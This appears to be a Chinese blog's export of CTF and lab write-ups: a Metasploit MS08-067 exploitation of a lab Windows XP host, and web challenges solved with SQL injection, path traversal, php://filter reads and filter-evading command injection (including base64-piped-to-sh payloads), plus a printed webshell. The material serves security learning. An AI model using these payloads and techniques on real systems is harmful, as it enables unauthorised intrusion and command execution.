对着箭画靶子，再来分析源代码：\n*\u0026amp;v3[25]即是y轴坐标，输入2执行++，1执行\u0026ndash;\nv4即是x轴坐标，初始为零，输入3执行\u0026ndash;，4执行++\nLABEL_13用于处理异常\n1 2 3 4 5 6 7 8 9 for ( i = 0; i \u0026lt;= 1; ++i ) // 边界检查 { if ( *\u0026amp;v3[4 * i + 25] \u0026gt;= 5u ) // 等价于 v3[25 + 4*i] 大于等于5 exit(1); // 越界退出 } if ( v7[5 * *\u0026amp;v3[25] - 41 + v4] == \u0026#39;1\u0026#39; ) // 5 * 当前行 - 41 + 当前列 exit(1); // 撞墙退出 if ( v7[5 * *\u0026amp;v3[25] - 41 + v4] == \u0026#39;#\u0026#39; ) //输出成功 v7 的地址紧接在 v3 之后（栈空间连续）\nv7[0] 对应 v3[41]（因为 v7 是 _BYTE[12]）\n所以v7要刻意减去41，也就是转化为v3。\n地图：\n1 2 3 4 5 * 1 1 1 1 0 1 0 0 0 0 1 0 1 0 0 0 0 1 0 1 1 1 1 # 可以得到flag:\n222441144222\n[SWPUCTF 2021 新生赛]非常简单的逻辑题 先分析一波源码：\n1 2 3 4 5 6 7 8 9 flag = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; # 秘钥 result = \u0026#39;\u0026#39; for i in range(len(flag)): s1 = ord(flag[i])//17 # 商 s2 = ord(flag[i])%17 # 余数 result += s[(s1+i)%34]+s[-(s2+i+1)%34] print(result) # result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; 暴力破解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; flag = \u0026#39;\u0026#39; index = 0 # flag的索引 for j in range(0, len(result), 2): # for i in range(0, 255): s1 = i // 17 s2 = i % 17 ss1 = s[(s1+index)%34] ss2 = s[-(s2+index+1)%34] r = ss1 + ss2 if r == result[j:j+2]: flag += chr(i) index += 1 print(flag) 输出：NSSCTF{Fake_RERE_QAQ}\n","date":"2024-11-26T00:00:00Z","image":"https://blog.wuko.top/posts/2024/11/26/letzreverseit.html/cover_hu_2f7aed3c3252995e.jpg","permalink":"https://blog.wuko.top/posts/2024/11/26/letzreverseit.html/","title":"ctf reverse解题+学习"},{"content":"准备工作 环境：\n攻击机（192.168.15.128）：Kali GNU/Linux Rolling x86_64\n靶机（192.168.15.129）： Windows XP Professional with Service Pack 3 (x86)\n本次攻击测试靶机镜像来自MSDN, 我告诉你，特别鸣谢！\n由于该漏洞已于2008年末被巨硬以发布补丁包的方式修复，所以有些较新的或者整合的镜像无法复现此漏洞，本人盆友亲测，故在此给出本人所用镜像，有需要可以到上面的网站下载：\n1 2 3 4 zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso SHA1: 69DBF131116760932DCF132ADE111D6B45778098 文件大小: 601.04MB 发布时间: 2008-05-01 开始 配置好XP系统，win+R输入cmd，在命令窗口执行查询ip命令：\n1 ipconfig 可知靶机ip为：192.168.15.129\n在我们的kali里依法炮制，查询ip：\n1 ifconfig 可知攻击机ip为：192.168.15.128\n两台机器在同一网段，方便我们进行后续操作。\n攻击 请出nmap，对靶机进行扫描：\n1 nmap -sV -Pn 192.168.15.129 解释下命令的参数：\n-sV 表示启用版本检测。-sV 使得 nmap 在扫描时不仅会检查开放的端口，还会尝试确定运行在这些端口上的服务的版本信息。例如，如果某个端口上运行的是 HTTP 服务，nmap 会尝试识别是 Apache、Nginx 还是其他 Web 服务，并尝试获取它们的版本号。\n-Pn 该选项告诉 nmap 不进行主机发现（Host Discovery）。通常，nmap 在扫描前会先进行主机发现，以确定目标主机是否在线（通过发送 ICMP 请求或 SYN 包等方式）。-Pn 选项告诉 nmap 跳过这一步，直接假设目标主机是在线的并进行扫描。\n扫描得到：\n可以看到靶机开放了三个端口，其中就有我们今天要利用的445端口。\n直接启动msf进行漏洞利用：\n1 msfconsole 因为我们已经知道了这个漏洞叫MS08-067，所以直接搜索：\n1 msf6\u0026gt; search ms08-067 可以看到它找到了一个结果，来使用它：\n1 msf6\u0026gt; use exploit/windows/smb/ms08_067_netapi 或：\n1 msf6\u0026gt; use 0 然后我们来选择靶机版本target，本人的msf在使用search后会自动列出所有target，但是盆友亲测不会，所以使用命令来列出所有target：\n1 msf6\u0026gt; show target 这里一定要注意选择你自己的靶机版本，比如盆友使用的是简体中文版的winxp sp3，选用繁中版本xp或者是server的都会无法连接：\n1 The connection was refused by the remote host (192.168.91.131:445). 默认target为第一个（0），使用set TARGET 序号/名称来设定target：\n1 msf6\u0026gt; set TARGET \u0026#39;Windows XP SP3 Chinese - Simplified(NX)\u0026#39; 效果图在最后面的图片。\n不建议复制我的，因为不同环境它的序号和名字也会变，比如我的简中XP序号是35，朋友的是10。\n如果设定了错误的target并且已经执行了的话，需要重启靶机，不然会无法连接到靶机的445端口。\n配置好target后，继续使用set来配置剩下需要配置的参数，查看所需参数：\n1 msf6\u0026gt; show options 配置RHOSTS、RPORT:\n1 2 msf6\u0026gt; set RHOSTS 192.168.15.129 msf6\u0026gt; set RPORT 445 这里遇到很神奇的事，可能是我俩版本不一样，我可以使用RHOST代替RHOSTS，但是朋友这样输就会报错，以及可能msf不会给你自动配置RPORT、LHOST，具体需要参考上面的options是否已有值。\n一切准备好后，开始攻击！\n输入run:\n1 msf6\u0026gt; exploit(windows/smb/ms08_067_netapi) \u0026gt; run 成功拿到shell!\n来测试一下：\n1 2 3 4 5 cd .. mkdir Ciallo cd Ciallo edit hacknya.txt sysinfo 完美！\n","date":"2024-11-20T00:00:00Z","image":"https://blog.wuko.top/posts/2024/11/20/ms08-067review-atk.html/done_hu_ac66eb6b68f09f18.png","permalink":"https://blog.wuko.top/posts/2024/11/20/ms08-067review-atk.html/","title":"【漏洞】windows漏洞MS08-067复现与攻击"},{"content":"[极客大挑战 2019]EasySQL 用户名随意，密码：\n1 \u0026#39; or 1=1;# 原理：SQL简单注入\n1 2 3 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39; AND password = \u0026#39;用户输入的密码\u0026#39;; #被更改为： SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39; AND password = \u0026#39;\u0026#39; OR 1=1;#\u0026#39;; '结束了密码的输入，or新加条件判断，#将后面变为注释，因为 1=1恒等于true，所以密码判断为真，直接登入成功。\nflag{bfec2c7f-5da3-426b-9736-04ceb6ff2283}\n[极客大挑战 2019]Havefun 注释中找到了很有意思的东西：\n1 2 3 4 5 6 7 \u0026lt;!-- $cat=$_GET[\u0026#39;cat\u0026#39;]; echo $cat; if($cat==\u0026#39;dog\u0026#39;){ echo \u0026#39;Syc{cat_cat_cat_cat}\u0026#39;; } --\u0026gt; payload:?cat=dog\n得到flag：flag{6e7317ce-c4ce-4112-809e-9c88c6d44a83}\n[HCTF 2018]WarmUp 源码得到source.php，访问得到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; 分析代码，需要传入一个名为file的参数，需满足以下条件：\n是字符串\n在whitelist中\n注意mb_strpos($page . '?', '?')，它负责以?分割出文件名，来判断是否在whitelist中，所以?后可以随便写。\n只要满足条件，include $_REQUEST['file'];就可以被执行，显示file传入的文件。\n通过访问/hint.php得到：\nflag not here, and flag in ffffllllaaaagggg\npayload:/source.php?file=source.php?/../../../../ffffllllaaaagggg\n基于以上，在多次跳转上一目录后，得到了flag：\nflag{5026a355-8b4e-4d00-8f08-a71a732e854c}\nLinux命令执行(下面几道题道题的前置知识) 参考\n1）|| 符号 当前一条命令执行结果为false 就执行下一条命令\n2）| 符号 只执行 | 符号后面的命令\n3）\u0026amp;\u0026amp; 符号 当前一条命令执行结果为true 就执行下一条命令\n4）\u0026amp; 符号 只执行 \u0026amp; 符号后面的命令\n5）; 符号 不管前一条命令执行的结果是什么，执行下一条命令\n6）a=l;b=s;$a$b //变量覆盖\n7）\\echo d2hvYW1p | base64 -d echo d2hvYW1p | base64 -d | bash //base64绕过\n8）wsaaaddd8450ho762aseba2amf0j71i wh$(caigou)oa$(anquan)mi 666whoami666 //反引号加混淆\n9）wh$1oami who$@ami whoa$*mi //$1、$@、$*混淆\n[ACTF2020 新生赛]Include 通过名字，猜测需要读取源码，\n利用php伪协议，payload:?file=php://filter/read=convert.base64-encode/resource=flag.php\n得到内容base64解密得到：\necho \u0026quot;Can you find out the flag?\u0026quot;;\n//flag{94c1e2f9-f482-4a77-9d04-fe9740ff2ee6}\n[ACTF2020 新生赛]Exec 因为Linux可以同时写两个命令：\n1 命令1|命令2 所以可以在ip后面加上其他的命令，比如ls，一层一层找，找到了flag：\nflag{86f478de-728b-40dc-aa9e-4be502142f24}\npayload: 127.0.0.1|ls ./../../../flag\n[GXYCTF2019]Ping Ping Ping 故技重施，被骂了呜呜呜：\n1 2 3 /?ip=127.0.0.1|cat%20flag.php /?ip= fxck your space! 看来过滤了空格，尝试绕过：\n1 2 3 $IFS ${IFS} $IFS$1 尝试直接输出flag.php，发现flag也被过滤，所以先尝试读取index.php：\npayload: ?ip=127.0.0.1|cat$IFS$1index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 |\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match)){ echo preg_match(\u0026#34;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match); die(\u0026#34;fxck your symbol!\u0026#34;); } else if(preg_match(\u0026#34;/ /\u0026#34;, $ip)){ die(\u0026#34;fxck your space!\u0026#34;); } else if(preg_match(\u0026#34;/bash/\u0026#34;, $ip)){ die(\u0026#34;fxck your bash!\u0026#34;); } else if(preg_match(\u0026#34;/.*f.*l.*a.*g.*/\u0026#34;, $ip)){ die(\u0026#34;fxck your flag!\u0026#34;); } $a = shell_exec(\u0026#34;ping -c 4 \u0026#34;.$ip); echo \u0026#34; \u0026#34;; print_r($a); } ?\u0026gt; 让AI分析一遍：\n过滤的字符和符号： 代码使用 preg_match() 对 IP 地址进行检查，防止特殊字符或符号（如 |, ', \u0026quot;, \\, (, ), [, ], {, }, /, ?, *, \u0026lt;, \u0026gt;, 空格等）被输入。\n阻止空格： 如果输入包含空格，程序会拒绝执行并输出 \u0026ldquo;fxck your space!\u0026quot;。\n阻止 bash： 如果输入中包含 \u0026ldquo;bash\u0026rdquo;，程序会拒绝并输出 \u0026ldquo;fxck your bash!\u0026quot;。\n阻止 flag： 如果输入中包含 \u0026ldquo;flag\u0026rdquo;，程序会拒绝并输出 \u0026ldquo;fxck your flag!\u0026quot;。\n方法一：\npayload:/?ip=127.0.0.1;s=ag;d=fl;cat$IFS$1$d$s.php\n原理：变量替换，ag写在前面防止检测\n方法二：\npayload:/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh\n原理：cat flag.php进行base64编码，用sh执行echo命令\n方法三：\npayload:/?ip=127.0.0.1;cat$IFS$9`ls` 原理：先执行ls，再把返回的值传入cat xxx\n需查看源码才能看到flag（一开始还以为靶机有问题，重启了好几次XDD）\nflag{c397edc5-dc1e-45e1-b1d1-2726fca99f2a}\n[SUCTF 2019]EasySQL 尝试可得，当输入是不为0的数字时，会输出Array ( [0] =\u0026gt; 1 )，可猜测这里有一个判断，当为真时继续执行接下来的操作。\n查阅wp，大佬们已经纷纷猜测出来了这里的语句：\n1 select $_GET[\u0026#39;query\u0026#39;] || flag from Flag 方法一 payload:1;select * ,1\n结合上面的语句，构建出来是这样的：\nselect *,1 || flag from Flag\n1 || flag 中的 || 是一个字符串连接操作符，用于将字符串连接在一起。\n1 是数字 1，在进行字符串连接时，数据库系统通常会自动将数字转换为字符串类型。 flag 是表 Flag 中的一个字段/列。\n因此，1 || flag 的意思是将数字 1 和 flag 列的值连接成一个新的字符串。如果 flag 列的值是 A，则 1 || A 的结果会是字符串 1A。\n所以总体的意思就是，从Flag表中选择所有数据以及由1和flag组成的字符串，输出：\nArray ( [0] =\u0026gt; 1 ) Array ( [0] =\u0026gt; flag{6fc12e75-bcc3-4c8d-9bfd-85a2630b9f31} [1] =\u0026gt; 1 )\n方法二 payload:1;set sql_mode=PIPES_AS_CONCAT;select 1\nset sql_mode=PIPES_AS_CONCAT将 SQL 模式设置为把管道符（|）作为字符串连接运算符。这意味着在查询中使用管道符时，它会被视为连接字符串的操作符，而不是其他默认的含义。这样可以改变某些 SQL 语句的行为以满足特定的需求。\n人话就是，把原本判断用法的逻辑运算符改成了连字符用法，输出： Array([0]=\u0026gt;1)Array([0]=\u0026gt;1flag{6fc12e75-bcc3-4c8d-9bfd-85a2630b9f31})\nweb1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 if(isset($_GET[\u0026#39;id\u0026#39;])){ $id = $_GET[\u0026#39;id\u0026#39;]; # 判断id的值是否大于999 if(intval($id) \u0026gt; 999){ # id 大于 999 直接退出并返回错误 die(\u0026#34;id error\u0026#34;); }else{ # id 小于 999 拼接sql语句 $sql = \u0026#34;select * from article where id = $id order by id limit 1 \u0026#34;; echo \u0026#34;执行的sql为：$sql\u0026lt;br\u0026gt;\u0026#34;; # 执行sql 语句 $result = $conn-\u0026gt;query($sql); # 判断有没有查询结果 if ($result-\u0026gt;num_rows \u0026gt; 0) { # 如果有结果，获取结果对象的值$row while($row = $result-\u0026gt;fetch_assoc()) { echo \u0026#34;id: \u0026#34; . $row[\u0026#34;id\u0026#34;]. \u0026#34; - title: \u0026#34; . $row[\u0026#34;title\u0026#34;]. \u0026#34; \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\u0026#34; . $row[\u0026#34;content\u0026#34;]. \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } # 关闭数据库连接 $conn-\u0026gt;close(); } }else{ highlight_file(__FILE__); } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- flag in id = 1000 --\u0026gt; %2b即为+，构建payload：/?id=1%2b999\n得到flag：ctfshow{c19d5249-4232-424a-97c4-1e3474c7dba8}\nweb2 区别：\n1 正则表达式 `/or|\\+/i` 表示匹配字符串中是否存在 `\u0026#34;or\u0026#34;` 或者 `\u0026#34;+\u0026#34;`。其中 `\u0026#34;i\u0026#34;` 表示不区分大小写。 那用乘法就好了。。。\npayload:/?id=2*500\n还找了半天乘号的url编码，原来可以直接用。。。\nctfshow{823e8ecb-33e3-4211-8d1f-1cd473263902}\nweb3 新增限制：\n1 2 3 if(preg_match(\u0026#34;/or|\\-|\\\\|\\*|\\\u0026lt;|\\\u0026gt;|\\!|x|hex|\\+/i\u0026#34;,$id)){ die(\u0026#34;id error\u0026#34;); } 正则表达式 /or|\\-|\\\\|\\*|\\\u0026lt;|\\\u0026gt;|\\!|x|hex|\\+/i 表示匹配包含以下任意一个字符的字符串：or、-、\\（反斜杠）、*、\u0026lt;、\u0026gt;、!、x、hex、+。其中 i 表示不区分大小写。\n你等等，除号/没屏蔽，试试：\npayload:/?id=500/0.5\n不知道为啥2000/2不行，可能是因为先传入的2000\u0026gt;999了。\nctfshow{7326bf8d-aeca-405c-8ccf-088fbf64b61f}\nweb4 1 2 3 if(preg_match(\u0026#34;/or|\\-|\\\\\\|\\/|\\\\*|\\\u0026lt;|\\\u0026gt;|\\!|x|hex|\\(|\\)|\\+|select/i\u0026#34;,$id)){ die(\u0026#34;id error\u0026#34;); } 正则表达式 /or|\\-|\\\\\\|\\/|\\\\*|\\\u0026lt;|\\\u0026gt;|\\!|x|hex|\\(|\\)|\\+|select/i 表示匹配包含以下任意一个字符的字符串：or、-、\\（反斜杠）、/、*、\u0026lt;、\u0026gt;、!、x、hex、(、)、+、select。其中 i 表示不区分大小写。\n全屏蔽了，但是没完全屏蔽：|，或运算没有被屏蔽，所以：\npayload:/?id=999||id=1000\n执行的sql为：select * from article where id = 999||id=1000 order by id limit 1\nctfshow{1f31bdb8-81ae-4546-a1d2-c9af01aadb46}\n[SWPUCTF 2021 新生赛]Do_you_know_http hackbar，先修改User-Agent为WLLM，转到a.php，要求从本地访问。\n添加X-Forwarded-For，内容127.0.0.1，得到flag。\n","date":"2024-11-14T00:00:00Z","image":"https://blog.wuko.top/posts/2024/11/14/web-ctf.html/cover_hu_59dbb5535b4cf06.png","permalink":"https://blog.wuko.top/posts/2024/11/14/web-ctf.html/","title":"【随缘更新中】ctf web类解密"},{"content":"签到 flag{buu_ctf}\n金三胖 给定GIF文件，可以很明显看到flag文字，对文件进行拆解，在20、50与78帧找到flag：\n你竟然赶我走 查看文件元数据，末尾得到flag：\nflag{stego_is_s0_bor1ing}\n二维码 直接扫码得到flag\u0026hellip;并没有，扫码得到：secret is here\n十六进制分析，发现有zip文件，使用binwalk分离，发现有一个名为4number.txt加密文件，使用APCHPR秒了：\n1 2 3 4 5 6 7 Advanced Archive Password Recovery 统计信息: 加密的 ZIP/RAR/ACE/ARJ 文件: D:\\BUU\\misc\\二维码\\_QR_code.png.extracted\\1D7.zip 总计口令: 8,741 总计时间: 10ms 平均速度(口令/秒): 874,100 这个文件的口令 : 7639 十六进制口令: 37 36 33 39 得到CTF{vjpw_wnoei}\n大白 修复图片长宽高，得到:flag{He1l0_d4_ba1}\n乌镇峰会种图 同你居然赶我走，查看文件元数据末尾得到flag：\nflag{97314e7864a8f62627b26f3f998c37f1}\nwireshark 用wireshark打开，查找关键词找到password：\nflag{ffb7567a1d4f4abdffdb54e022f8facd}\nN种方法解决 下载下来发现是.exe文件，直接运行失败，拖到IDA pro里查看，发现其开头为data:image/jpg;base64后跟一串base64，将它转换为图片：\n扫码得到：KEY{dca57f966e4e4e31fd5b15417da63269}\n基础破解 给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。\n使用APCHPR秒了：2563\n解压得到flag.txt，内容ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=\nbase64解码: flag{70354300a5100ba78068805661b93a5c}\n文件中的秘密 下载，直接查看图片属性，得到flag：flag{870c5a72806115cb5439345d8b014396}\nzip伪加密 谜底出在谜面上，对它使用zip伪加密修复吧！\n得到flag.txt:flag{Adm1N-B2G-kU-SZIP}\nLSB 使用Stegsolve.jar提取RGB通道数据，得到二维码：\n扫描得到：cumtctf{1sb_i4_s0_Ea4y}\n被嗅探的流量 wireshark打开，http分类，找到upload:\nflag{da73d88936010da1eeeb36e945ec4b97}\nrar 已知密码是4位，使用APCHPR秒了：8795\n解压得到：flag{1773c5da790bd3caff38e3decd180eb7}\nqr 扫码得到：欢迎参加本次比赛，密码为 Flag{878865ce73370a4ce607d21ca01b5e59}\n镜子里面的世界 Stegsolve.jar打开提取数据：\nHey I think we can write safely in this file without any one seeing it. Anyway, the secret key is: st3g0_ saurus_wr3cks\nflag{st3g0_saurus_wr3cks}\n爱因斯坦 查看图片16进制，好家伙，塞了一个zip，使用binwalk分离，得到一个加密的zip，APCHPR失败，继续寻找密码。。。图片exif找到：this_is_not_password，尝试，得到flag：flag{dd22a92bf2cceb6c0cd0d6b83ff51606}\nningen 下载图片查看十六进制，发现还有其他文件，使用foremost提取出加密的zip，结合提示秋明特别讨厌中国的六位银行密码，喜欢四位数,APCHPR秒了:8368\nflag{b025fc9ca797a67d2103bfbc407a6d5f}\n小明的保险箱 和ningen一样，binwalk分离得到rar文件，根据提示4位数，APCHPR秒了：7869\nflag{75a3d68bf071ee188c418ea6cf0bb043}\neasycap wireshark发现全是TCP，右键追踪流得到：\nFLAG:385b87afc8671dee07550290d16a8071\n隐藏的钥匙 查看图片元数据，找到文本：flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=).\nbase64解码得到：377cbadda1eca2f2f73d36277781f00a\n另外一个世界 图片查看元数据，结尾发现\n01101011011011110110010101101011011010100011001101110011\n判断为2进制，转换成文字为：koekj3s\n数据包中的线索 wireshark追踪http流，得到一大串base64码，转换成图片：\nflag{209acebf6324a09671abc31c869de72c}\n神秘龙卷风 根据提示4位数，APCHPR秒了：5463\n解压打开一看，不是哥们：\n查阅得知，这是brainfuck加密，很形象的名字，差点大脑升级，，，\nbrainfuck在线解密：https://www.splitbrain.org/services/ook\nflag{e4bbef8bdf9743f8bf5b727a9f6332a8}\nFLAG （教练，我\u0026hellip;我想打CTF） Stegsolve.jar打开提取数据，得到zip文件\n打开提示损坏，但仍然可解压出1文件，得到flag:\nctf{dd0gf4c3tok3yb0ard4g41n~~~}\n假如给我三天光明 下载下来文件，解压得到一个加密的zip和一张图片，图片里有神秘图形，查找得知，这是盲文，网上搜对照表解密得出；kmdonowg，尝试用这个密码解压压缩包，得到wav音频文件，听出是莫斯电码，解码得到：CTFWPEI08732?23DZ，去掉ctf并且全小写即为flag。\n后门查杀 下载文件会被拦截。。无视风险下载后，找到一个可疑的文件web.php，内容是一个典型的webshell:\n1 2 3 \u0026lt;?php include($_GET[act] . \u0026#34;.php\u0026#34;); ?\u0026gt; 通过向其传入act参数，可以执行任意php文件。但是我们要找的是md5密码，所以继续查找，找到了attacktest.sql，里面找到管理员密码：0192023a7bbd73250516f069df18b500，遗憾的是这并不是flag，继续查找。\n找了半天，在include/include.php的第40行找到flag：6ac45fb83b3bc355c024f5034b947dd3，后查阅WP才知道，原来有专门的webshell查杀工具。。可以直接得到flag。。。\nwebshell后门 这次直接下载了D盾，一顿扫描：\n在/member/zp.php中31行找到flag：ba8e6c6f35a53933b871480bb9a9545c\n来首歌吧 下载打开，是彩虹猫！\n一开始还以为是音频隐写，尝试密码100无法解密，查阅WP发现原来是摩斯电码。。。用audacity打开，发现左音频是摩斯电码：\n..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.\n解码得到：5BC925649CB0188F52E617D70929191C\n面具下的flag 图片查看16进制，发现后面还有zip，binwalk提取出zip，鉴定为zip伪加密，解压得到flag.vmdk，用DiskGenius打开，得到三个文件夹，拷贝到桌面删不掉了。。。而且也打不开。遂挂载到虚拟机用kali打开：\n1 2 3 4 +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++.+ +++++ .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;- -.+++ +++.\u0026lt; ++++[ -\u0026gt;+++ +\u0026lt;]\u0026gt;+ +++.\u0026lt; +++++ +[-\u0026gt;- ----- \u0026lt;]\u0026gt;-- ----- --.\u0026lt;+ +++[- \u0026gt;---- \u0026lt;]\u0026gt;-- ----- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ +++++ .\u0026lt;+++ +[-\u0026gt;- ---\u0026lt;] \u0026gt;-.\u0026lt;+ +++++ [-\u0026gt;++ ++++\u0026lt; ]\u0026gt;+++ +++.\u0026lt; +++++ [-\u0026gt;-- ---\u0026lt;] \u0026gt;---- -.+++ .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;- ----- .\u0026lt; 和神秘龙卷风一样，brainfuck加密，解密得到：\nflag{N7F5_AD5\n到这里死活找不到另一半flag，查阅WP才知道，原来只有在Linux上解压才能得到完整文件。。。。。\n7z x flag.vmdk -o./\n得到多了key_part_two/where_is_flag_part_two.txt:flag_part_two_is_here.txt\n内容是一堆Ook加密，一样的网站解密得到：\n_i5_funny!}\n荷兰宽带数据泄露 检查文件，发现这是一个路由器配置文件，给嫩用RouterPassView打开（这个软件俺曾在记:天翼网关ZXHN F650V2.0.0P1T3超管破解用过，妹想到现在居然又能用到），得到明文，试了半天，flag是用户名：053700357621\n九连环 图片binwalk提取出zip，伪加密修复得到一张图片和一个压缩包，图片用steghide解密：\n1 .\\steghide.exe extract -sf .\\good-已合并.jpg 解密得到ko.txt:\n1 2 看到这个图片就是压缩包的密码： bV1g6t5wZDJif^J7 用这个解压压缩包，得到flag：flag{1RTo8w@\u0026amp;4nK@z*XL}\n[BJDCTF2020]认真你就输了 解压，在xl/charts/flag.txt\n找到：flag{M9eVfi2Pcs#}\n被劫持的神秘礼物 第四个数据，得到name:admina,word:adminb，拼接得到：adminaadminb转换为md5 32位全小写：\n1d240aafe21a86afc11f38a45b541a49\n被偷走的文件 导出ftp协议传输文件，得到flag.rar，加密了，使用APCHPR秒了：5790\n解压得到flag.txt:\nflag{6fe99a5d03fb01f833ec3caa80358fa3}\n[BJDCTF2020]藏藏藏 解压得到图片，用foremost提取出zip，解压得到flag：\nflag{you are the best!}\n[GXYCTF2019]佛系青年 zip伪加密修复，解压得到文本与图片：\n1 2 以上略 佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸 佛曰密码，与佛论禅解密得到:\nflag{w0_fo_ci_Be1}\n[BJDCTF2020]你猜我是个啥 直接无法解压，查看文件十六进制，发现是png图片格式，更改后缀，得到一个二维码，扫描得到：flag²»ÔÚÕâ实测并不是flag，最后在图片16进制末尾发现flag：\nflag{i_am_fl@g}\n刷新过的图片 尝试众多方法，无果，查阅wp，原来是F5隐写：\nF5-steganography\n安装：git clone https://github.com/matthewgao/F5-steganography\n需要java8环境，而且不知道为啥我Windows环境跑啥反应也没有。。。于是在kali装了java8并且解密出了一个out.txt:\njava Extract Misc.jpg\n解密得到的文件查看16进制，发现是zip，改后缀发现加密，使用伪加密修复，解压得到flag：\nflag{96efd0a2037d06f34199e921079778ee}\n秘密文件 wireshark打开，过滤ftp，发现可疑数据：\n恢复到时间排序，找到文件的传输数据(tcp.stream eq 6)，~~ 追踪流导出文件，得到rar压缩包 ~~，这样导出只能得到一部分文件。。。用foremost提取文件，得到加密的rar，使用APCHPR秒了：1903\n解压得到flag：flag{d72e5a671aa50fa5f400e5d10eedeaa5}\n[BJDCTF2020]鸡你太美 小鸡子漏出黑脚了，解压得到两个gif，其中副本无法打开。用010 editor打开，发现副本缺少GIF头文件47 49 46 38，插入，复制自十六进制文本，成功得到flag：\nflag{zhi_yin_you_are_beautiful}\n[BJDCTF2020]just_a_rar 解压得到加密的rar，名字为四位数，使用APCHPR秒了：2016\n解压得到一jpg，exif中找到flag：flag{Wadf_123}\nsnake 下载得到一图片，foremost分离出一zip，解压得到：\nciper: 疑似二进制文件\nkey: 内容为V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo= base64解码得到：What is Nicki Minaj's favorite song that refers to snakes?，谷歌得到：\u0026quot;Anaconda\u0026quot; is a song by rapper Nicki Minaj.所以秘钥应是Anaconda。\n没头绪，查阅wp，原来是serpent加密，使用在线解密工具serpent encryptipn解密得到：\nCTF{who_knew_serpent_cipher_existed}\n菜刀666 分析好像是恶意利用eval()注入某些东西，怪不得电脑报毒。。。里面有z1和z2，目测一个是base64一个是十六进制：\n1 z1=RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D\u0026amp;z2=FFD8FFE000104A4...(后略) z1解码为：D:\\wamp64\\www\\upload\\6666.jpg\n那么z2就应该是这个图片了，用010 editor新建文件，把值复制进去，得到图片：\nTh1s_1s_p4sswd_!!!\n在1367找到一个zip文件以及一串字符：well,you need passwd!\nforemost提取出zip，发现加密，输入之前找到的密码，得到flag：\nflag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}\n[BJDCTF2020]一叶障目 修复长宽高，得到：xaflag{66666}\n[SWPU2019]神奇的二维码 